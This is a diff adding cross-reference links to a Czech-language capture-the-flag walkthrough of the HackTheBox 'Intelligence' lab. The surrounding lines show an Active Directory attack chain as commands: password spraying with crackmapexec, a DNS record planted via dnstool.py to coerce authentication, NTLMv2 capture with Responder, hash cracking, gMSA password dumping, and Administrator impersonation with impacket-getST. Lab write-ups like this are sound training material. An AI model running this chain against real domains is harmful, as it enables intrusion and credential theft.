@@ -39,6 +39,8 @@ twebdiscover -u http://$IP -t 40 -Po -wdc
 ### Metadata PDF a seznam uživatelů
 
 Stažené PDF soubory mají v metadatech jména autorů. `exiftool` tak rychle odhalí první validní uživatele jako `William.Lee` a `Jose.Williams`. Jakmile se ukáže, že tento způsob funguje, dává smysl stáhnout systematicky všechny datumové varianty, vyextrahovat další `Creator` hodnoty a ověřit je přes `kerbrute`.
+
+Prakticky k tomu, kdy je `Kerbrute` nejlepší jako validátor jmenného prostoru před dalšími kerberovými kroky, viz i [Kerbrute](/nastroje/kerbrute).
 ```text
 exiftool *.pdf
 Creator : William.Lee
@@ -56,6 +58,8 @@ Právě jedna z historických nahrávek, `2020-06-04-upload.pdf`, pak obsahuje r
 ### Od výchozího hesla k účtu `Tiffany.Molina`
 
 Jakmile dokument prozradí defaultní heslo, je rozumné ho vyzkoušet proti celé sadě validních uživatelů. `crackmapexec` potvrdí, že funguje pro `Tiffany.Molina`, což okamžitě otevírá SMB přístup.
+
+Prakticky k tomu, kdy je `CrackMapExec` nejlepší jen jako validátor credential hypotézy, viz i [CrackMapExec](/nastroje/crackmapexec).
 ```text
 crackmapexec smb intelligence.htb -u Machines/Intelligence/users.txt -p NewIntelligenceCorpUser9876
 => intelligence.htb\Tiffany.Molina:NewIntelligenceCorpUser9876
@@ -77,6 +81,8 @@ To je přesně ten typ automatizace, který se dá zneužít ke coerced authenti
 ### SMB jako `Tiffany.Molina`
 
 Účet `Tiffany.Molina` nedává interaktivní shell, ale stačí k přístupu do uživatelských share. Tím se potvrzuje běžný uživatelský kontext a zároveň vzniká prostor pro čtení dalších interních skriptů.
+
+Praktické použití podobného čtení share a interních souborů shrnuji i v článku [smbclient](/nastroje/smbclient).
 ```text
 impacket-smbclient Tiffany.Molina:NewIntelligenceCorpUser9876@intelligence.htb
 cat user.txt
@@ -88,6 +94,8 @@ c678168bde461de7eff5f37a310d6178
 ### Vynucená autentizace `Ted.Graves`
 
 První část rootu spočívá v DNS záznamu a naslouchání na HTTP. Přes `dnstool.py` se přidá `webthacker.intelligence.htb`, Responder zachytí NTLMv2 hash `Ted.Graves` a `john` ho crackne na `Mr.Teddy`.
+
+Prakticky k tomu, kdy `Responder` jen přijímá už vyvolanou autentizaci, viz i [Responder](/nastroje/responder).
 ```text
 python3 dnstool.py -u 'intelligence.htb\Tiffany.Molina' -p 'NewIntelligenceCorpUser9876' -a add -r 'webthacker.intelligence.htb' -d 10.10.14.11 10.10.10.248
 sudo responder -I tun0 -A
@@ -100,6 +108,8 @@ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
 ### gMSA účet `svc_int$` a impersonace administrátora
 
 Účet `Ted.Graves` sám o sobě ještě root nedává, ale `gMSADumper.py` ukáže, že skupina `itsupport` smí číst heslo gMSA účtu `svc_int$`. Jakmile je k dispozici NTLM hash gMSA, lze přes `impacket-getST` vyžádat service ticket pro `WWW/dc.intelligence.htb` a rovnou při tom impersonovat `Administrator`.
+
+Širší praktický kontext k podobným utilitám a jejich rodinám je v článku [Impacket](/nastroje/impacket).
 ```text
 python3 gMSADumper.py -u 'Ted.Graves' -p 'Mr.Teddy' -d 'intelligence.htb' -l 'dc.intelligence.htb'
 Users or groups who can read password for svc_int$:
